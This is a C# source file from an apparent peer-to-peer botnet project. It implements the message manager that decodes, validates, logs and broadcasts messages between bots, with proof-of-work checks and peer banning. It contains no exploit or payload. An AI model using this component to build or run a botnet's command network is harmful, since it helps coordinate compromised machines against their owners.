using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using Vinchuca.Network.Protocol.Handlers;
using Vinchuca.Network.Protocol.Peers;
using Vinchuca.Utils;
using Vinchuca.Workers;

namespace Vinchuca.Network.Protocol.Messages
{
    public class PackageReceivedEventArgs<T> : EventArgs
    {
        public T Proto { get; set; }
        public byte[] Payload { get; set; }
        public int Count { get; set; }

        public PackageReceivedEventArgs(T proto, byte[] payload, int count)
        {
            Proto = proto;
            Payload = payload;
            Count = count;
        }
    }

    public interface IMessageSender
    {
        void Send(Message message, BotIdentifier botId, ulong correlationId = 0, short ttl=0);
    }

    public class MessageManager : IMessageSender
    {
        private readonly PeerManager _peerManager;
        private readonly IDictionary<short, MessageMetadata> _messageIdMap;
        private readonly IDictionary<Type, MessageMetadata> _messageTypeMap;
        private static readonly Log Logger = new Log(new TraceSource("Mesg-Manager", SourceLevels.Verbose));

        public MessageManager(PeerManager peerManager)
        {
            _messageIdMap = new Dictionary<short, MessageMetadata>();
            _messageTypeMap=new Dictionary<Type, MessageMetadata>();

            _peerManager = peerManager;
            _peerManager.BotPackageReceivedEventArgs += BotPackageReceivedEventArgs;
        }

        private void BotPackageReceivedEventArgs(object sender, PackageReceivedEventArgs<BotHeader> e)
        {
            var header = e.Proto;
            var botId = header.BotId;
            var meta = _messageIdMap[e.Proto.MessageId];
            if (!IsExpectedMessage(header))
            {
                Logger.Warn("[R] <--- Unexpected message from {0,-22}   {1}", meta.Type.Name, botId);
                _peerManager.Punish(botId);
            }
            var message = DecodeMessage(header.MessageId, e.Payload, (BotHeader.Size + header.Padding), header.PayloadSize);
            LogMessaging(message, botId, false);

            var botMessage = new BotMessage { Header = header, Message = message };
            if (!PoW.IsEnough(e.Payload, 0, header.PayloadSize + header.Padding + BotHeader.Size, meta.RequiredWork))
            {
                Logger.Warn("[R] <--- Insufficient work for {0,-22}   {1}", meta.Type.Name, botId);
                _peerManager.Ban(e.Proto.EndPoint);
            }

            meta.MessageHandler.Handle(botMessage);
        }

        private bool IsExpectedMessage(BotHeader header)
        {
            var meta = _messageIdMap[header.MessageId];

            if (meta.MessageType == MessageType.Request)
            {
                return true;
            }
            if (meta.MessageId == MessageCode.Ack)
            {
                return true;
            }
            if (meta.MessageType == MessageType.Reply)
            {
                return _peerManager.WaitingForReply.VerifyExpected(header.EndPoint, header.CorrelationId);
            }

            return false;
        }

        public void Register(MessageCode messageId, MessageType messageType, Type type, IMessageHandler messageHandler, int requiredWork)
        {
            var metadata = new MessageMetadata(messageId, messageType, type, messageHandler, requiredWork);
            _messageIdMap.Add((short)messageId, metadata);
            _messageTypeMap.Add(type, metadata);
        }

        public byte[] EncodeMessage(Message message, BotIdentifier botIdentifier)
        {
            return message.Encode();
        }

        public Message DecodeMessage(short messageId, byte[] data, int offset, int count)
        {
            try
            {
                var messageMetadata = _messageIdMap[messageId];
                var type = messageMetadata.Type;
                var message = (Message)Activator.CreateInstance(type);

                using (var br = new BinaryReader(new MemoryStream(data, offset, count)))
                {
                    message.Decode(br);
                }
                return message;
            }
            catch (Exception e)
            {
                return new InvalidMessage(e);
            }
        }

        public void Send(Message message, BotIdentifier botId, ulong correlationId = 0, short ttl=0)
        {
            if (ttl < 0) return;

            var meta = _messageTypeMap[message.GetType()];
            var payload = message.Encode();
            LogMessaging(message, botId, true);
            ClientWorker.Instance.Queue(() =>
                _peerManager.Send(meta, correlationId, ttl, payload, botId));
        }

        [Conditional("DEBUG")]
        public static void LogMessaging(Message m, BotIdentifier botId, bool sending)
        {
            var messageType = m.GetType().Name;
            var bid = botId.ToString();

            Logger.Verbose("[{0}] {1} {2,-24} {3,-5} {4} ",
                            sending ? "S" : "R",
                            sending ? "--->" : "<---",
                            messageType,
                            sending ? "to" : "from",
                            bid.Substring(0, Math.Min(12, bid.Length))
                );
        }

        public void Broadcast(Message msg, short ttl)
        {
            foreach (var botId in _peerManager.GetBotIdentifiers())
            {
                Send(msg, botId, 0, ttl--);
            }
        }
    }
}